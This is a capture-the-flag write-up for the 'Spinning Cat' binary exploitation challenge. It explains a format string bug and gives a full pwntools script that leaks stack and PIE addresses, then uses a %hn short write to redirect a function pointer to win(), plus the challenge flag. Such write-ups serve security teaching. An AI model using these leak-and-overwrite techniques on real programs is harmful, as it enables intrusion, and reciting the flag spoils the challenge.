# Spinning Cat

**Category:** Binary Exploitation
**Flag:** `UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}`

## Challenge Overview

> **Files:** `spinning_cat`, `libc.so.6`, `ld-linux-x86-64.so.2`
> **Remote:** `nc chal.umcybersec.site 10276`

## Initial Enumeration / Recon

```bash
checksec ./spinning_cat
# RELRO: Full  CANARY: No  NX: Yes  PIE: Yes
```

No canary — good news. PIE is enabled though, so a leak is needed. The binary's key function is `spin()`: it reads user input then calls `printf(user_input)` directly — textbook format string vulnerability.

Critically, `spin()` stores a **function pointer** to `sing_oiia` on the stack. Each loop iteration calls this pointer, and the loop only exits when input contains "HALT". There's also a hidden `win()` function that reads and prints the flag.

## Vulnerability Analysis

Because `printf(buf)` uses user-controlled data as the format string:

- `%N$p` leaks stack values to de-randomize PIE.
- `%N$hn` writes short values to arbitrary addresses.

Sending `%3$p.%7$p` reveals:
- `%3$p` — address of the input buffer on the stack.
- `%7$p` — the current `sing_oiia` function pointer.

The function pointer sits on the stack. Overwriting its low 16 bits to point to `win()` causes the next loop iteration to call `win()`.

## Exploitation Steps

```python
from pwn import *
from pathlib import Path

context.binary = elf = ELF("./spinning_cat")
context.log_level = "info"

io = remote("chal.umcybersec.site", 10276)

# Stage 1: leak buf address and sing_oiia
io.recvuntil(b"frequency: ")
io.sendline(b"%3$p.%7$p")
leak_blob = io.recvuntil(b"frequency: ")

leak_line = None
for line in leak_blob.decode("latin-1", "replace").splitlines():
    if line.startswith("0x") and ".0x" in line:
        leak_line = line
        break

buf_addr, sing_oiia = [int(x, 16) for x in leak_line.split(".")[:2]]
log.info(f"buffer    @ {hex(buf_addr)}")
log.info(f"sing_oiia @ {hex(sing_oiia)}")

fp_addr   = buf_addr - 8          # function pointer slot = buf - 8
win       = sing_oiia - 0x9D      # win() is 0x9D bytes before sing_oiia
win_low16 = win & 0xFFFF

# Stage 2: overwrite low 16 bits of function pointer with %hn
payload = f"%{win_low16}c%10$hn".encode() + b"aaa" + p64(fp_addr)
io.sendline(payload)

print(io.recvall(timeout=2).decode("latin-1", "replace"))
```

## Flag

```
UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}
```

Format string bugs grant both read and write primitives simultaneously. The `%hn` short write is particularly useful when a function pointer shares the same high bytes as an adjacent known address — you only need to change the low 16 bits, keeping the payload small and reliable.
